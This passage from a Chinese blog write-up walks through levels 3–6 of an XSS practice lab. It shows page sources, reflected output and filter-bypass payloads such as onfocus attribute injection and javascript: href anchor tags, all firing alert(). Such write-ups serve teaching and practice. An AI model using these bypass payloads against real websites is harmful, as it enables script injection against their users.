class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>没想到符号也被实体化了，我们看一下源码</p><p><img src="/.com//708aed34e8abff5bf1958a5568edd2c4-20250425091306-lnvekb8.png" alt="708aed34e8abff5bf1958a5568edd2c4"></p><p>果然被实体化了，但是htmlspecialchars函数只针对&lt;&gt;大于小于号进行html实体化，我们还可以利用其他方法进行xss注入，这里我们可以利用<strong>onfocus事件绕过</strong></p><blockquote><p>所以我们可以利用这个事件来绕过&lt;&gt;号的过滤已达到执行js的目的，构造&#x3D;&#x3D;payload&#x3D;&#x3D;</p><p>​<code>&#39; onfocus=javascript:alert() &#39;</code>​</p></blockquote><p><img src="/.com//09e73e59e14d25787995c6673e83e46a-20250425091557-v3d1sb9.png" alt="09e73e59e14d25787995c6673e83e46a"></p><p>然后再点击输入框触发onfocus事件即可</p><p><img src="/.com//e28f81b6f82595fe857a54a45ba3f647-20250425091605-01k82o1.png" alt="e28f81b6f82595fe857a54a45ba3f647"></p><p><strong>本关小结</strong> ：onfocus可以绕过html实体化（即&lt;&gt;号的过滤）</p><hr><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>查看一下网站源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和try harder!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;try harder!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level4.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:11<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这里是双引号闭合，&lt;input&gt;标签，所以我们还能继续利用onfocus事件，构建payload</p><blockquote><p>​<code>&quot; onfocus=javascript:alert() &quot;</code>​</p></blockquote><p><img src="/.com//image-20250425091946-nyeouet.png" alt="image"></p><p>看一下这关的源码</p><p><img src="/.com//f23de092ba6e0a07cfdc613516dcfb7c-20250425092013-apm0zn4.png" alt="f23de092ba6e0a07cfdc613516dcfb7c"></p><p>这里只是把&lt;&gt;号给删掉了，没多做过滤</p><p> <strong>本关小结</strong>：无</p><hr><h1 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和find a way out!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;find a way out!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:15<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这关感觉常规的方法过不去，我们先试试看</p><blockquote><p>​<code>&quot; onfocus=javascript:alert() &quot;</code>​</p></blockquote><p>不成功看回显</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;quot;</span> onfocus=javascript:alert() <span class="hljs-symbol">&amp;quot;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">o_nfocus</span>=<span class="hljs-string">javascript:alert()</span> &quot;&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:31<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>果然，这里on被替换成了o_n，先看一下这关的源码<br>​<img src="/.com//fb3c126f3dd9291adf4d4877b09afea2-20250425092229-7hxybq6.png" alt="fb3c126f3dd9291adf4d4877b09afea2"></p><p>&#x3D;&#x3D;过滤了js的标签还有onfocus事件&#x3D;&#x3D;，虽然str_replace不区分大小写，但是有小写字母转化函数，所以就不能用大小写法来绕过过滤了，只能新找一个方法进行xss注入，这里我们用<strong>a href标签法</strong>，</p><blockquote><p><img src="/.com//3d76230687597cd12652b56bb2abc570-20250425092322-35rjh6k.png" alt="3d76230687597cd12652b56bb2abc570"></p><p><strong>href属性</strong>的意思是 当标签 <strong>&lt;a&gt;</strong> 被点击的时候，就会<strong>触发执行转跳</strong>，上面是转跳到一个网站，我们还可以触发执行一段js代码</p></blockquote><p>添加一个标签得闭合前面的标签，构建payload</p><blockquote><p>​<code>&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</code>​</p></blockquote><p>后面点击链接跳转即可通关</p><p><strong>本关小结</strong>：可以插入标签（如&lt;a&gt;标签的href属性）达到js执行的效果，前提是闭合号&lt;“”&gt;没失效</p><hr><h1 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level7.php?keyword=move up!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level6<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level6<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和break it out!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level6.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;break it out!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level6.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:13<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这感觉很悬，不知道过滤了啥，输入关键字测试看看</p><blockquote><p>​<code>onfocus &lt;script&gt; &lt;a href=javascript:alert()&gt;</code>​</p></blockquote><p>来查看一下过滤</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level7.php?keyword=move up!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level6<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level6<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和onfocus <span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a href=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level6.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;o_nfocus &lt;scr_ipt&gt; &lt;a hr_ef=javascript:alert()&gt;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level6.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:47<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了好多，看看大小写能不能绕过</p><blockquote><p>​<code>OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level7.php?keyword=move up!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level6<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level6<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和onfocus <span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span> <span class="hljs-symbol">&amp;lt;</span>a href=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level6.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;o_nfocus &lt;scr_ipt&gt; &lt;a hr_ef=javascript:alert()&gt;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level6.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:47<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span 